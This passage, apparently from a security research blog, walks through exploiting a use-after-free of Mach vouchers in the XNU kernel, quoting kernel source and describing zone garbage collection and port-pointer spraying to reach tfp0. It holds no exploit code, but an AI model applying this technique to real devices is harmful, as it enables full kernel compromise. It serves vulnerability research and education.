    &lt;span class=&quot;mi&quot;&gt;2605&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2606&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2607&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;NDR_record_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2608&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_voucher_selector_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;which&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2609&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2610&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2614&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request__thread_get_mach_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2615&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Reply__thread_get_mach_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reply&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2616&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2617&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/*
    2618: 	 * typedef struct {
    2619: 	 * 	mach_msg_header_t Head;
    2620: 	 * 	NDR_record_t NDR;
    2621: 	 * 	kern_return_t RetCode;
    2622: 	 * } mig_reply_error_t;
    2623: 	 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2624&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 

    &lt;span class=&quot;mi&quot;&gt;2686&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;thr_act&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_port_to_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_request_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2687&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2688&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_get_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thr_act&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;which&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2689&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;thread_deallocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thr_act&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2690&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2691&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;MIG_RETURN_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2692&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2695&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;convert_voucher_to_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2702&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Once we get a dangling pointer to a freed voucher object, we can then reallocate the freed voucher object with something else. However, this is not straightforward. Vouchers typically reside in their own zone &lt;strong&gt;ipc vouchers&lt;/strong&gt; as can be seen in &lt;strong&gt;osfmk/ipc/ipc_voucher.c&lt;/strong&gt; where the &lt;strong&gt;zinit&lt;/strong&gt; call allocates a new zone for the vouchers.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;198&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;199&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;202&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr_manager_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;203&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_index_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;204&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;205&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_voucher_zone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zinit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;206&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				 &lt;span class=&quot;n&quot;&gt;ipc_voucher_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;207&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				 &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;208&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				 &lt;span class=&quot;s&quot;&gt;&quot;ipc vouchers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;209&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;zone_change&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher_zone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Z_NOENCRYPT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;210&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;211&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	
    &lt;span class=&quot;mi&quot;&gt;216&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;So the freed memory for the voucher will be placed in the freelist of the zone and allocated to a new voucher when it is created. Therefore in order to reallocate with some other object, the only feasible way is to initiate zone garbage collection which will move the freed memory for the vouchers (min size is 1 page which includes the freed voucher) into the zone map and then reallocate that memory with something else. Zone garbage collection can be triggered by allocating a large number of vouchers and freeing them, making that memory available for next allocation and then spraying via port pointers as we will see later in this article.&lt;/p&gt;

&lt;p&gt;Let’s look closely at &lt;strong&gt;thread_get_mach_voucher&lt;/strong&gt; in &lt;strong&gt;MIG&lt;/strong&gt; generated code again. Assuming we did reallocate the freed voucher with some object, the call &lt;strong&gt;thread_get_mach_voucher&lt;/strong&gt; should succeed without panicking the kernel, since we are interested in &lt;strong&gt;tfp0&lt;/strong&gt; eventually and not really kernel panics. The function &lt;strong&gt;thread_get_mach_voucher&lt;/strong&gt; inside the kernel which is called on Line 2688 calls &lt;strong&gt;ipc_voucher_reference(voucher)&lt;/strong&gt; , which should mean that the &lt;strong&gt;iv_refs&lt;/strong&gt; field should be valid for the voucher.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE_X86_64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread_act_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2597&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Routine thread_get_mach_voucher */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2598&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mig_internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;novalue&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_Xthread_get_mach_voucher&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2599&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2600&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2601&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2602&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifdef&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;__MigPackStructs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2603&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2604&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2605&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2606&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2607&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;NDR_record_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2608&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_voucher_selector_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;which&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2609&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2610&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2611&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifdef&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;__MigPackStructs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2612&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2613&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2614&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request__thread_get_mach_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2615&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__Reply__thread_get_mach_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reply&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unused&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2616&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2617&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/*
    2618: 	 * typedef struct {
    2619: 	 * 	mach_msg_header_t Head;
    2620: 	 * 	NDR_record_t NDR;
    2621: 	 * 	kern_return_t RetCode;
    2622: 	 * } mig_reply_error_t;
    2623: 	 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2624&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2625&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2626&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;Reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OutHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2627&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifdef&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;__MIG_check__Request__thread_get_mach_voucher_t__defined&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2628&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2629&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* __MIG_check__Request__thread_get_mach_voucher_t__defined */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2630&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2631&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;__MigKernelSpecificCode&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2632&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;UseStaticTemplates&lt;/span&gt;
